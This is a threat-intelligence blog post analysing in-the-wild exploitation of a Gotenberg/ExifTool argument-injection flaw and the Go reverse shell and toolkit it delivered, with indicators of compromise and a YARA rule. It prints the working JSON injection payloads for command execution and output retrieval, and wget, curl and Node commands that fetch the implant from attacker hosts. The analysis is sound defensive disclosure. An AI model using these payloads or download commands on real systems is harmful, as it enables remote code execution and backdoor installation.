---
title: "Cache Me If You Can: Unpacking a Go Implant and Its Toolkit | Blog | VulnCheck"
source: https://www.vulncheck.com/blog/cache-me-if-you-can
source_host: www.vulncheck.com
clip_date: 2026-10-28T08:01:02+08:00
trace_id: 080f83a8-d4cd-4480-ad5b-dfb1f71200aa
content_hash: 2b9c5622659544ed7a61653774a8f05df4c9d95a8b7fddc43749ee7e78311766
status: synced
tags:
  - 恶意样本
  - 漏洞分析
series: null
feed_source: VulnCheck·漏洞研究
ai_summary: Go 逆向木马 cache_base 借 CVE-2026-42589（Gotenberg/ExifTool 参数注入，CVSS 9.8）落地，背后是含七个月开发史、多平台多入口的完整攻击工具库。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 40775244-d011-81d9-bf2e-e60da66aaad7
ioc:
  cves:
    - CVE-2026-42589
  cwes: []
  hashes:
    - 15a85a360cff18223f67d13351164f96
    - 1938a3545517650824657fd09ce4ee16
    - 2b85605660343399a650b8c3745bccb0
    - 71e1bc42c0c27db494a9032730846436
    - 7cd551ba71f3aaf184141532417356da
    - 80514271f21b82268d86743728a0543e
    - a5d5418ae862208ea77bdb0d8228e107
    - c31cd755293844f8ac0802d2c438e701
    - f5a756d13697cdfa69ed795d4468339d
  domains:
    - b51f3a2a.lazyrabbit.pages.dev
    - cheeva.strangled.net
    - linux-x86-tcpudp.strangled.net
    - strangled.net
    - ubuntu-repo.strangled.net
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points）**
>
> Go 逆向木马 cache_base 借 CVE-2026-42589（Gotenberg/ExifTool 参数注入，CVSS 9.8）落地，背后是含七个月开发史、多平台多入口的完整攻击工具库。
> 
> - **漏洞利用：** 攻击者通过 PDF metadata JSON key 注入换行与 `-if` 参数执行任意 Perl 代码，用 `id > /tmp/nx_cmd.txt` + `-Subject<=` 回读输出验证，再经 wget/curl/Node fetch 三个独立镜像下载 payload；30 天内观测 1,358 次利用、128 个来源 IP、至少 7 个不同攻击簇（扫描、XMRig 挖矿、Python 反弹 shell 等）。
> - **木马本体：** cache_base 为 5.2MB 静态编译 stripped Go ELF（Go 1.22.2），靠 `.gopclntab` 还原函数名；创建 `.cached_db.lock` 单实例锁、查询 ipinfo.io、在 C2 与本地 /bin/sh 间转发，无持久化逻辑；C2 用 afraid.org DDNS（ubuntu-repo/linux-x86-tcpudp.strangled.net），便于随时更换后端 IP。
> - **关联基建：** 三个下载镜像——GitHub secmonjp/alxpng、阿里云北京自建 Gitea、Oracle 东京 DDNS 主机；Gitea 上另发现同代码库的另一构建 cache_cn（C2 为硬编码 Hetzner IP 5.161.100.63），函数表与 cache_base 完全一致。
> - **更大武器库：** 仓库含 188 次提交、跨 Linux x86/ARM64/MIPS 与 Windows 的多平台构建、HTTP/SSH/TCP/UDP 多协议工具 `log_*`、看门狗 `temp` + 下载器 `pull` 组成的恢复机制、JuicyPotatoNG/RegPwn 提权工具、混淆 PHP webshell，以及带反弹 shell 的 WordPress/Joomla 恶意插件，全部指向同一 `*.strangled.net:7070` 基建。
> - **开发轨迹：** 2026 年 3 月建库起持续演进：4-5 月加 VPNGate 配置与 webshell，6 月转向 Python 开发并删除 VPN 配置，7 月加 Windows 工具，8 月高频迭代 pull，9 月出 ARM64，10 月删源码留二进制——表明这是长期维护的项目而非单次攻击的临时工具。

In early October 2026, one of our [canaries](https://www.vulncheck.com/product/canary-intelligence) caught an attacker exploiting Gotenberg's [CVE-2026-42589](https://console.vulncheck.com/cve/CVE-2026-42589) to deploy a custom Go reverse shell called `cache_base`. The activity came from a residential Japanese IP and lasted a couple of days. There were only 38 recorded canary events, but the attacker gave us the full exploit chain, including command execution, output retrieval, and three attempts to download an implant from independent mirrors.

We pulled apart the implant binary and traced its command-and-control infrastructure. Then we followed one of the payload mirrors to a GitHub repository with seven months of development history, multiple backdoors, Windows privilege escalation tools, PHP webshells, and suspicious CMS plugins. The repository contained a much larger toolkit than the original exploit suggested, including a second build of the reverse shell configured to use different C2 infrastructure.

## Exploiting Gotenberg CVE-2026-42589

Gotenberg is an open-source, Docker-based API that converts documents to PDF. It uses headless Chromium and LibreOffice to turn HTML, URLs, and Office files into PDFs, which makes it a common choice for generating invoices and reports and for document management systems. The project reports 97M+ Docker pulls and 12k+ GitHub stars, and says it is trusted in production by thousands of companies... and the VulnCheck Canary network

Every hit we observed targeted `POST /forms/pdfengines/metadata/write`, a Gotenberg API endpoint that accepts a PDF and a JSON metadata object that passes through Gotenberg to ExifTool. The vulnerability, [CVE-2026-42589](https://console.vulncheck.com/cve/CVE-2026-42589), allows an attacker to inject ExifTool arguments through unsanitized metadata keys. By inserting newlines into a JSON key, an attacker can inject the `-if` argument and execute arbitrary Perl code. The vulnerability carries a CVSS score of 9.8 and was fixed in Gotenberg 8.31.0.

The attacker used a four-stage chain to test command execution, retrieve the output, download `cache_base`, and confirm the file was present.

![Exploit Chain: Gotenberg to cache\_base](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/7900b7258803b94c.png)

First, they ran `id` and redirected the output to `/tmp/nx_cmd.txt`:

```json
{"Title\n-if\nsystem(q{id > /tmp/nx_cmd.txt 2>&1});1\n-Keywords=Nx-zD\n-Comment":"x"}
```

They then retrieved the output through ExifTool's `-Subject<=` operator, which placed the contents of the temporary file in the response PDF's Subject metadata:

```json
{"Title\n-if\n1\n-Subject<=/tmp/nx_cmd.txt\n-Keywords=NxR\n-Comment":"x"}
```

This gave the attacker the assurance they were dealing with a vulnerable system. With the vulnerability confirmed, they tried three different methods to download the payload:

```bash
# GitHub
wget https://raw.githubusercontent[.]com/secmonjp/alxpng/refs/heads/main/cache_base

# Self-hosted Gitea
curl -O http://39.105.65.32:3000/renjazu-czbhb4/etc/raw/branch/main/cache_base

# Dynamic DNS
node -e "fetch('http://cheeva.strangled[.]net/cache_base').then(r=>r.arrayBuffer()).then(b=>require('fs').writeFileSync('cache_base',Buffer.from(b)))"
```

The Node.js fallback is worth noting. Gotenberg runs on Node.js, so the runtime is available even in stripped-down containers that might not include `wget` or `curl`. If the standard download utilities aren't installed, the attacker can still try to retrieve the payload using the application's runtime. After the download attempts, the attacker ran `ls`, redirected the output to the same temporary file, and retrieved it to check whether `cache_base` appeared in the directory listing.

## CVE-2026-42589 Is Attracting Multiple Actors

Before following `cache_base` further, we looked at the broader exploitation activity surrounding CVE-2026-42589. Over the 30 days covered by our analysis, we recorded **1,358 exploitation events from 128 unique source IPs**. Great Britain and Israel accounted for 1,127 and 224 events, respectively.

Despite this activity, [CVE-2026-42589](https://console.vulncheck.com/cve/CVE-2026-42589) is not listed in CISA's Known Exploited Vulnerabilities (KEV) catalog. VulnCheck added the vulnerability to [VulnCheck KEV](https://console.vulncheck.com/browse/kev) on June 26, 2026. Our telemetry shows exploitation across multiple campaigns, from commodity scanning to cryptomining and custom backdoor deployment. In-the-wild exploitation doesn't wait for inclusion in CISA's catalog.

The source infrastructure, payloads, and techniques point to at least seven distinct clusters:

-   **Contabo scanner:** The largest cluster came from `5.189.138.115`, a Contabo-hosted IP in France. Between October 19 and 24, it generated 364 events using `python-requests/2.34.2` and delivered payloads through a Cloudflare Pages redirect at `b51f3a2a.lazyrabbit.pages[.]dev/redirectrev`. The exploit carrier was `x.pdf`. This source alone accounted for more than a quarter of the exploitation we observed and remained active as we prepared this analysis.
-   **Telecom Italia infrastructure:** More than 20 rotating IPs on Telecom Italia's network probed for the vulnerability from late June into early August. The activity progressed from probing to downloading x86 and ARM payloads from `185.132.53.158:81/anonymus/client`. A related Hetzner IP, `46.62.130.44`, served additional payloads and staged a file named `systemd` from Cloudflare R2. This was the earliest exploitation we observed in our dataset.
-   **XMRig cryptomining:** On August 31, `107.175.69.137`, hosted by HostPapa/ColoCrossing, generated 13 events consistent with the Gotenberg campaign [documented](https://the-hunters-ledger.com/reports/gotenberg-rce-cryptomining-107-175-69-137/) by The Hunter's Ledger. That campaign reportedly compromised approximately 200 Gotenberg instances and installed XMRig under the name `polkitd`. A companion IP, `192.255.159.249`, reported deployment status to `107.175.69.137:8081` using callbacks such as `/ALIVE_$(hostname)`, `/DEPLOY_$(hostname)`, and `/FAIL_$(hostname)`.
-   **Python reverse shells:** Seven Google Cloud IPs in Singapore injected Python reverse shells connecting to `77.110.106.217`. Some variants used ngrok for tunneling.
-   **S3-hosted payloads:** Eight GSL Networks IPs downloaded a payload disguised as `banner_homepage_800x800.jpg` from an S3 bucket.
-   **Pool Miner:** A source in Poland dropped `4thepool_miner.sh` alongside a base64-encoded payload named `lulinha`, part of another cryptomining operation.

We also saw one-off probes, Nuclei scans, and activity from various Indonesian and Vietnamese ISPs.

Then there was `210.170.22.208`, the source of our `cache_base` activity. Unlike the scanner and cryptomining campaigns, this activity delivered a custom Go reverse shell using three independent payload mirrors and dynamic DNS infrastructure. That combination gave us a different trail to follow: the binary itself, its command-and-control endpoints, and the repository behind one of the mirrors.

![CVE-2026-42589 Exploitation Timeline](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/fc45af9cb0ff1c76.png)

## Inside cache_base

`cache_base` is a 5.2 MB statically linked, stripped Go ELF binary for x86-64, built with Go 1.22.2. The embedded source path points to `/home/ubuntu/cache_base.go`. Although the binary has been stripped, Go's `.gopclntab` section retains function names used by the runtime, giving us a useful outline of its implementation.

The execution flow is straightforward: acquire a lock, collect host information, connect to C2, register the victim, and open a shell. The binary creates `./.cached_db.lock` to enforce single-instance execution, queries `ipinfo.io` for the victim's public IP and location information, and pipes input and output between the network connection and a local `/bin/sh`. It also sets `PYTHONUNBUFFERED=1`, suggesting the operator expects to run Python commands through the shell and wants output delivered without buffering delays.

Two C2 endpoints are hardcoded in the binary:

-   `ubuntu-repo.strangled[.]net:8090`
-   `linux-x86-tcpudp.strangled[.]net:21`

Both use afraid.org's `strangled[.]net` dynamic DNS domain, allowing the operator to change the backing IP addresses without rebuilding the binaries. The first endpoint supports HTTP and HTTPS, and string artifacts suggest a possible WebSocket upgrade for the shell session. The binary uses Go's default `Go-http-client/2.0` user-agent.

There is no persistence mechanism in `cache_base` itself. We found no logic for installing systemd units, modifying crontabs, injecting SSH keys, or adding startup scripts. The binary is a reverse shell, not a complete persistence solution. Something else has to deliver it, and something else must maintain access if the shell disconnects.

## Following the Infrastructure

The first payload mirror was the public GitHub repository [secmonjp/alxpng](https://github.com/secmonjp/alxpng). The account was created on January 7, 2026, and is associated with `fatmediajpn@gmail.com`. At the time of analysis, the repository contained 188 commits, with activity as recently as October 19. The repository had no stars, forks, or description, and GitHub classified it as PHP, likely because of the webshells it contained.

The second mirror was a self-hosted Gitea instance at `39.105.65.32:3000`, hosted on Alibaba Cloud in Beijing (AS37963). Its repository, `renjazu-czbhb4/etc`, used a throwaway email address, `ieein1e4a8@movtzj.lab`. Registration was open, and the repository was created on September 27, roughly ten days before the activity reached our canaries.

The Gitea repository also contained a `cache_cn` implant. We downloaded it and compared it to our observed `cache_base` binary. They have different SHA256 hashes and Go BuildIDs, so they're not duplicate copies of the same executable. But their function tables are identical. Both contain `main.checkAndAcquireLock`, `main.getPublicIP`, and `main.handleShellSession`, along with the same four closure goroutines. The embedded source paths differ only in the filename: `/home/ubuntu/cache_base.go` versus `/home/ubuntu/cache_cn.go`.

`cache_cn` appears to be a separate build of the same codebase, configured with different C2 infrastructure. While `cache_base` connects to `ubuntu-repo.strangled[.]net:8090` and `linux-x86-tcpudp.strangled[.]net:21`, `cache_cn` connects to `5.161.100.63:21`, a Hetzner Cloud VPS in Ashburn, Virginia. Its C2 is a hardcoded IP rather than a DDNS hostname. The `_cn` suffix might indicate a build intended for a different region or operating environment, but the filename alone doesn't establish that. We can say only that the same codebase has been built with different C2 configurations.

The third mirror was `cheeva.strangled[.]net`, which resolved to `132.145.123.143`, an Oracle Cloud instance in Tokyo (AS31898). The hostname uses afraid.org's free dynamic DNS service, allowing the operator to change the underlying IP address without rebuilding or redistributing binaries containing a hardcoded address. The service has appeared in reporting on threat actor infrastructure, including activity attributed to APT29, although that history alone does not establish a connection to this activity. The host served `cache_base` over HTTP on port 80 and appears to have also functioned as a C2 listener on port 7070.

![CVE-2026-42589 Infrastructure Overview](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/3eb509c5470a51bc.png)

## The Rest of the Arsenal

The `secmonjp/alxpng` repository contains dozens of files committed over seven months. We analyzed every file and found a broader toolkit built around the reverse shell: a separate multi-protocol Go tool, a downloader, a watchdog, Windows privilege escalation utilities, PHP webshells, CMS backdoor plugins, and legitimate Tailscale binaries.

The repository contains two distinct Go codebases. One group, including the `cache_*` binaries, includes builds for Linux x86-64, ARM64, MIPS32, and Windows. `ufw.exe`, for example, is a Windows build of the same reverse shell. The `log_*` family is different: its function table includes HTTP, SSH, TCP, and UDP workers, along with a monitoring loop and support for custom HTTP headers.

Two additional programs suggest how the toolkit could be deployed and maintained. The `pull` binary contains hardcoded GitHub URLs for `cache_base`, `dev_log`, `temp`, and `headers.txt`, indicating that it can download the reverse shell, the multi-protocol tool, a watchdog, and its configuration. The `temp` binary checks for `.cached_db.lock`, the same lock file created by `cache_base`, and attempts to restart the agent if it isn't running. That gives the operator a basic deployment and recovery mechanism, even though the reverse shell itself has no persistence logic.

The Windows tooling includes two known privilege escalation utilities. `kitanai.exe` is JuicyPotatoNG, while `nandemo.exe` is a.NET assembly whose embedded PDB path identifies it as RegPwn. The repository also contains `upd-ms.bat`, a loop that repeatedly launches the Windows tooling with a payload and a connection to `*.strangled[.]net:7070`. The `tailscale.exe` and `tailscaled.exe` files are legitimate Tailscale binaries. If deployed and configured on a compromised host, they could provide another route for remote access.

The PHP artifacts provide another way to access compromised web servers. The repository contains three webshells, including two obfuscated variants that provide file management, system enumeration, and command execution. Their original filenames, `wp-common.php` and `wp-blocks.php`, resembled WordPress core files before being renamed.

Three small plugin archives target WordPress and Joomla. The WordPress package `akismetv4-plugin.zip` contains a one-line Bash reverse shell that attempts to connect to `cheeva.strangled[.]net:7070`. The Joomla packages, `Hlx.zip` and `template.zip`, use an installation hook to write a PHP webshell into the site. These components connect the CMS tooling to the same infrastructure used by the Go backdoor.

The repository isn't just a collection of unrelated payloads. Its components cover multiple platforms and several ways to maintain access, from an interactive shell to web-accessible file managers and Windows privilege escalation tools. Not every file ties to a specific deployment, but together they show a much broader set of capabilities than the original Gotenberg exploit revealed.

![The cache\_base Toolkit](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/40f7d13c8e2ed2a8.png)

The repository brings together tooling for several platforms and different methods of remote access. The Go binaries provide shell access and multi-protocol networking, the watchdog can restart the reverse shell, and the webshells and CMS plugins offer additional ways to access compromised systems. We can't establish that every component was deployed in the same intrusion, but the repository shows that `cache_base` is part of a much broader toolkit.

## Seven Months of Development

The Git history shows how the toolkit evolved. The repository was created in March 2026. In April and May, VPNGate configuration files for Japan, Korea, and Vietnam appeared alongside the PHP webshells. June brought a burst of Python development, including `cache.py`, `caches.py`, `log.py`, and `xlog.py`, as well as a phishing page named `ph.html`. The VPN configurations were deleted on June 23.

Windows tooling arrived in July, including `upd-ms.bat` and `wincache.go`, a Windows-oriented Go variant that was created and deleted on the same day. In August, the `pull` binary was uploaded five times on August 13, suggesting active iteration. The Gitea account associated with the second payload mirror was created later that month.

ARM64 variants appeared in September, and the Gitea repository was created on September 27. On October 1, the author deleted more development artifacts, including Python scripts, shell scripts, and a JSP file, while leaving the compiled binaries in place. The GitHub repository continued to receive updates, with the latest recorded push on October 20.

The history shows sustained development rather than a repository assembled for a single campaign. The author added platform support, experimented with different components, and periodically removed source files while retaining compiled payloads. We can't establish that every file was operational or that all the tools were used in the same intrusion, but the history provides a much broader view of the toolkit than the initial exploit attempt alone.

## Wrapping Up

What started as 38 exploit attempts led us to a custom Go reverse shell, three payload mirrors, a second build with different C2 infrastructure, and a repository containing seven months of development history. That repository includes tooling for multiple architectures, Windows privilege escalation, webshells, and backdoors targeting WordPress and Joomla.

The infrastructure and repository history also show the limits of what we can conclude. The same codebase appears in multiple builds, but that doesn't establish the operator's identity or prove that every component was used in the observed attack. What we can say is that the `cache_base` activity is part of a broader toolkit that has been actively developed and maintained.

Multiple actors are exploiting CVE-2026-42589, with objectives ranging from scanning and cryptomining to custom backdoor deployment. VulnCheck added it to our KEV in June, and the activity we've observed since then reinforces the need to look beyond any single catalog or campaign. If you're running an unpatched Gotenberg instance, you aren't facing just one payload or one operator. You're facing a vulnerability that has attracted a range of actors, using different infrastructure and tools.

*Analysis performed October 24, 2026. Binary sourced from canary telemetry and threat intelligence collection.*

## Indicators of Compromise

### Network

| Type | Indicator | Context |
| --- | --- | --- |
| IP  | `210.170.22.208` | Attack source, residential Japan, AS2519 ARTERIA Networks |
| IP  | `39.105.65.32` | Gitea payload server, Alibaba Cloud Beijing, AS37963 |
| IP  | `132.145.123.143` | DDNS target, Oracle Cloud Tokyo, AS31898 |
| IP  | `5.161.100.63` | `cache_cn` C2, Hetzner Cloud, port 21 |
| Domain | `ubuntu-repo.strangled[.]net` | C2, port 8090 |
| Domain | `linux-x86-tcpudp.strangled[.]net` | C2, port 21 |
| Domain | `cheeva.strangled[.]net` | Payload hosting, port 80; suspected C2, port 7070 |
| URL | `https://raw.githubusercontent[.]com/secmonjp/alxpng/refs/heads/main/cache_base` | GitHub payload mirror |
| URL | `http://39.105.65[.]32:3000/renjazu-czbhb4/etc/raw/branch/main/cache_base` | Gitea payload mirror |
| URL | `http://cheeva.strangled[.]net/cache_base` | DDNS payload mirror |

### File hashes

| File | Hash |
| --- | --- |
| `cache_base` MD5 | `f5a756d13697cdfa69ed795d4468339d` |
| `cache_arm64` MD5 | `c31cd755293844f8ac0802d2c438e701` |
| `cache_mips` MD5 | `2b85605660343399a650b8c3745bccb0` |
| `cache_log` MD5 | `71e1bc42c0c27db494a9032730846436` |
| `kitanai.exe` MD5 | `1938a3545517650824657fd09ce4ee16` |
| `nandemo.exe` MD5 | `15a85a360cff18223f67d13351164f96` |
| `ufw.exe` MD5 | `7cd551ba71f3aaf184141532417356da` |
| `808.php` MD5 | `a5d5418ae862208ea77bdb0d8228e107` |
| `xmain.png` MD5 | `80514271f21b82268d86743728a0543e` |

### Host artifacts

-   `./.cached_db.lock`: Hidden lock file created by the reverse shell.
-   `/tmp/nx_cmd.txt`: Temporary file used to stage command output during exploitation.
-   `PYTHONUNBUFFERED=1`: Environment variable set by the Go binary.
-   `Go-http-client/2.0`: Default Go HTTP user-agent observed in outbound traffic.
-   Go BuildID prefix: `95lC4hD3Rlc49k0IkwPb`

### Accounts

-   GitHub: `secmonjp` / `fatmediajpn@gmail.com`
-   Gitea: `renjazu-czbhb4` / `ieein1e4a8@movtzj.lab`

### YARA

```md
rule cache_base_backdoor {
    meta:
        description = "Go reverse shell backdoor - cache_base family"
        date = "2026-10-24"
    strings:
        $c2_1 = "ubuntu-repo.strangled.net:8090"
        $c2_2 = "linux-x86-tcpudp.strangled.net:21"
        $lock = ".cached_db.lock"
        $ip_recon = "https://ipinfo.io"
        $env = "PYTHONUNBUFFERED=1"
        $src = "/home/ubuntu/cache_base.go"
        $go_buildid = "95lC4hD3Rlc49k0IkwPb"
    condition:
        uint32(0) == 0x464c457f and
        (any of ($c2_*) or ($lock and $ip_recon) or $src or $go_buildid)
}
```

## About VulnCheck

The VulnCheck team investigates real-world exploitation to understand attacker behavior, track malicious infrastructure, and identify vulnerabilities that matter to defenders. For more research, see [*Expanding Visibility Into Chinese Government-linked Cyber Threat Actors*](https://www.vulncheck.com/blog/integrity-technology-group-advisory), [*Chinese Implants in the Supply Chain*](https://www.vulncheck.com/blog/chinese-implants-in-the-supply-chain), [*From Canary Intelligence to C2: Mapping an Attack Fleet with Target Intelligence*](https://www.vulncheck.com/blog/meowproject), and [*The Return of the Kinsing*](https://www.vulncheck.com/blog/the-return-of-the-kinsing).

Sign up on our website for free access to [VulnCheck KEV](https://console.vulncheck.com/browse/kev) and our [vulnerability data](https://console.vulncheck.com/browse). You can also request a trial of [Initial Access Intelligence](https://www.vulncheck.com/product/initial-access-intelligence), [IP Intelligence](https://www.vulncheck.com/product/ip-intelligence), and [Exploit & Vulnerability Intelligence](https://www.vulncheck.com/product/exploit-intelligence).
